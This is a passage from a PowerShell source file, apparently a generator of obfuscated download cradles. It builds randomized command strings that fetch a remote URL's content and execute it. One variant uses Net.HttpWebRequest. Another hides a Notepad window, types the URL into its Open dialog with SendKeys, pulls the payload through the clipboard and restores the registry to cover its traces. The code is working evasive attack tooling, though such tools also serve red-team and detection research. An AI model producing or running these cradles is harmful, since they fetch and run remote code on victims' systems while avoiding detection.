                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetHttpWebRequest','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$NetHttpWebRequest::Create('$Url').GetResponse().GetResponseStream()"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar2)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar2)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar3)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar3)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$Response"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Since we may have += syntax if Stream option 3 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar3 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar3.Contains(' -V'))
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetHttpWebRequest','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$NetHttpWebRequest::Create('$Url').GetResponse().GetResponseStream()"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        If($SetVar2.Contains(' '))
                        {
                            # Add extra parenthese for SetVar2 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar2 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar2)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar2)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar3)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar3)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1($Response)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        10 {
            ###############################################################
            ## PsSendKeys (New-Object -ComObject WScript.Shell).SendKeys ##
            ###############################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url'    # Url
                    $RandomVarName2 = 'app'    # Application
                    $RandomVarName3 = 'title'  # Application Title
                    $RandomVarName4 = 'wshell' # WScript.Shell
                    $RandomVarName5 = 'props'  # Properties of Application Display
                    $RandomVarName6 = 'res'    # Result from Clipboard
                    $RandomVarName7 = 'curpid' # Current PID for Application
                    $RandomVarName8 = 'reg'    # Registry Path for Notepad Application Properties
                          
                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 8

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # These boolean variables are used to avoid redundant commands to force module auto-loading in PS3.0+.
                    $HasModuleAutoLoadCommand         = $FALSE
                    $HasModuleAutoLoadCommandWithTags = $FALSE

                    # There are reasons that you may rather call Notepad.exe or even C:\Windows\System32\Notepad.exe.
                    # These scenarios are interesting opportunities for defenders.
                    # Hopefully I will be sharing more information about this in the near future.
                    $SendKeysApp   = 'Notepad'
    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','SleepMilliseconds','ComObjectFlag','ReflectionAssembly','IWindowPosX','IWindowPosY','IWindowPosDX','IWindowPosDY','StatusBar','GetItemProperty','SetItemProperty','LoadWithPartialName','HasModuleAutoLoadCommand','Exec','AppActivate','SendKeys','GetText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $iWindowPosDX = $iWindowPosDX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosDY = $iWindowPosDY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosX  =  $iWindowPosX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosY  =  $iWindowPosY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $StatusBar    =    $StatusBar.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $AppActivate  =  $AppActivate.Replace($WScriptShellTag,$GetVar4)
                        $SendKeys     =     $SendKeys.Replace($WScriptShellTag,$GetVar4)
                        $GetText      =      $GetText.Replace($WindowsFormsClipboardTag,"[$WindowsFormsClipboard]")
                        $Exec         =         $Exec.Replace($WScriptShellTag,$GetVar4)
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2'$SendKeysApp'"
                        $CommandArray += "$SetVar8'HKCU:\Software\Microsoft\Notepad'"

                        If(!$HasModuleAutoLoadCommand -AND $NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $NewObject = $NewObject.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar4$NewObject$ComObjectFlag WScript.Shell"

                        If(!$HasModuleAutoLoadCommand -AND $GetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($GetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $GetItemProperty = $GetItemProperty.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar5($GetItemProperty$GetVar8)"

                        $CommandArray += ("$ReflectionAssembly::" + $LoadWithPartialName.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "('System.Windows.Forms')")

                        If(!$HasModuleAutoLoadCommand -AND $SetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $SetItemProperty = $SetItemProperty.Replace($ModuleAutoLoadTag,'')

                        # Set Notepad's properties (namely sizing and status bar configurations) to reduce visibility and potential noise.
                        # Randomize the order of these properties.
                        $SetItemListTemp = @(@("'$StatusBar'",0),@("'$iWindowPosY'","([String]($WindowsFormsScreen::AllScreens)).$ScreenHeight"))
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_01)
                        {
                            $SetItemList += , $SetItemListTemp[$Index]
                        }

                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $SetItemPropValue;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }
                                      
                                $SetItemPropNameTrimmed += "@($SetItemPropName,$SetItemPropValue)"
                            }
                              
                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable[0] $CurrentItemVariable2[1]}"
                        }
                        $CommandArray += $SetItemSyntax

                        # Since 'Notepad - Untitled' application title is language specific (and we need this to perform AppActivate checks for higher reliability on slower systems), we will query MainWindowTitle from Notepad instance that we launch.
                        # This will also reduce the likelihood of errors if additional Notepad windows are already present.
                        $CommandArray += "$SetVar7$GetVar4.$Exec($GetVar2).ProcessID"
                        $CommandArray += "While(!($SetVar3$GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}|$ForEachRandom{$CurrentItemVariable2.MainWindowTitle})){$SleepMilliseconds}"
                        $CommandArray += "While(!$GetVar4.$AppActivate($GetVar3)){$SleepMilliseconds}"
                          
                        # The below ^o (Open) shortcut does not appear to be language dependent.
                        # If there are scenarios in which it is then we can switch to: '%','{ENTER}','{DOWN}','{ENTER}'
                        $CommandArray += "$GetVar4.$SendKeys('^o')"
                        $CommandArray += $SleepMilliseconds
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @($GetVar1,"(' '*1000)","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax
                        $CommandArray += "$SetVar6`$Null"
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'^a'","'^c'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "While($GetVar6.Length$LessThanTwoRandom){[$WindowsFormsClipboard]::$ClearClipboard;$SendKeysSyntax;$SleepMilliseconds;$SetVar6([$WindowsFormsClipboard]::$GetText)}"
                        $CommandArray += "[$WindowsFormsClipboard]::$ClearClipboard"

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'%f'","'x'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'{TAB}'","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "If($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}){$SendKeysSyntax}"

                        # Set Notepad's properties (namely sizing and status bar configurations) back to pre-download state stored in propertiy variable ($GetVar5).
                        # Randomize the order of these properties.
                        $SetItemListTemp = @("'$iWindowPosDX'","'$iWindowPosDY'","'$iWindowPosX'","'$iWindowPosY'","'$StatusBar'")
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_012345)
                        {
                            $SetItemList += $SetItemListTemp[$Index]
                        }
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                # Encapsulate with parentheses for $SetItemPropName2 if it ends with .Value.
                                $SetItemPropName2 = $SetItemPropName
                                If($SetItemPropName2.EndsWith(').Value'))
                                {
                                    $SetItemPropName2 = "($SetItemPropName2)"
                                }
                                  
                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $GetVar5.$SetItemPropName2;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }

                                $SetItemPropNameTrimmed += $SetItemPropName
                            }
                              
                            # Encapsulate with parentheses for $CurrentItemVariable2ForSetItemSyntax if it ends with .Value.
                            $CurrentItemVariable2ForSetItemSyntax = $CurrentItemVariable2
                            If($CurrentItemVariable2ForSetItemSyntax.EndsWith(').Value'))
                            {
                                $CurrentItemVariable2ForSetItemSyntax = "($CurrentItemVariable2ForSetItemSyntax)"
                            }

                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable $GetVar5.$CurrentItemVariable2ForSetItemSyntax}"
                        }
                        $CommandArray += $SetItemSyntax

                        $SyntaxToInvoke = $GetVar6

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_0123] + $CommandArray[$ArrayIndexOrder_45] + $CommandArray[6..$CommandArray.Length])  -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 8

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # These boolean variables are used to avoid redundant commands to force module auto-loading in PS3.0+.
                    $HasModuleAutoLoadCommand         = $FALSE
                    $HasModuleAutoLoadCommandWithTags = $FALSE

                    # There are reasons that you may rather call Notepad.exe or even C:\Windows\System32\Notepad.exe.
                    # These scenarios are interesting opportunities for defenders.
                    # Hopefully I will be sharing more information about this in the near future.
                    $SendKeysApp   = 'Notepad'
    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','SleepMilliseconds','ComObjectFlag','ReflectionAssembly','IWindowPosX','IWindowPosY','IWindowPosDX','IWindowPosDY','StatusBar','GetItemProperty','SetItemProperty','LoadWithPartialName','HasModuleAutoLoadCommand','Exec','AppActivate','SendKeys','GetText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $iWindowPosDX = $iWindowPosDX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosDY = $iWindowPosDY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosX  =  $iWindowPosX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosY  =  $iWindowPosY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $StatusBar    =    $StatusBar.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $AppActivate  =  $AppActivate.Replace($WScriptShellTag,$GetVar4)
                        $SendKeys     =     $SendKeys.Replace($WScriptShellTag,$GetVar4)
                        $GetText      =      $GetText.Replace($WindowsFormsClipboardTag,"[$WindowsFormsClipboard]")
                        $Exec         =         $Exec.Replace($WScriptShellTag,$GetVar4)
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2'$SendKeysApp'"
                        $CommandArray += "$SetVar8'HKCU:\Software\Microsoft\Notepad'"

                        If(!$HasModuleAutoLoadCommand -AND $NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $NewObject = $NewObject.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar4($NewObject$ComObjectFlag WScript.Shell)"

                        If(!$HasModuleAutoLoadCommand -AND $GetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($GetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $GetItemProperty = $GetItemProperty.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar5($GetItemProperty$GetVar8)"

                        $CommandArray += ("$ReflectionAssembly::" + $LoadWithPartialName.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "('System.Windows.Forms')")

                        If(!$HasModuleAutoLoadCommand -AND $SetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $SetItemProperty = $SetItemProperty.Replace($ModuleAutoLoadTag,'')

                        # Set Notepad's properties (namely sizing and status bar configurations) to reduce visibility and potential noise.
                        # Randomize the order of these properties.
                        $SetItemListTemp = @(@("'$StatusBar'",0),@("'$iWindowPosY'","([String]($WindowsFormsScreen::AllScreens)).$ScreenHeight"))
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_01)
                        {
                            $SetItemList += , $SetItemListTemp[$Index]
                        }

                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $SetItemPropValue;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }
                                      
                                $SetItemPropNameTrimmed += "@($SetItemPropName,$SetItemPropValue)"
                            }
                              
                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable[0] $CurrentItemVariable2[1]}"
                        }
                        $CommandArray += $SetItemSyntax

                        # Since 'Notepad - Untitled' application title is language specific (and we need this to perform AppActivate checks for higher reliability on slower systems), we will query MainWindowTitle from Notepad instance that we launch.
                        # This will also reduce the likelihood of errors if additional Notepad windows are already present.
                        $CommandArray += "$SetVar7$GetVar4.$Exec($GetVar2).ProcessID"
                        $CommandArray += "$SetVar3`$Null;While(!($GetVar3)){$SetVar3($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}|$ForEachRandom{$CurrentItemVariable2.MainWindowTitle});$SleepMilliseconds}"
                        $CommandArray += "While(!$GetVar4.$AppActivate($GetVar3)){$SleepMilliseconds}"
                          
                        # The below ^o (Open) shortcut does not appear to be language dependent.
                        # If there are scenarios in which it is then we can switch to: '%','{ENTER}','{DOWN}','{ENTER}'
                        $CommandArray += "$GetVar4.$SendKeys('^o')"
                        $CommandArray += $SleepMilliseconds
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @($GetVar1,"(' '*1000)","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax
                        $CommandArray += "$SetVar6`$Null"
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'^a'","'^c'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
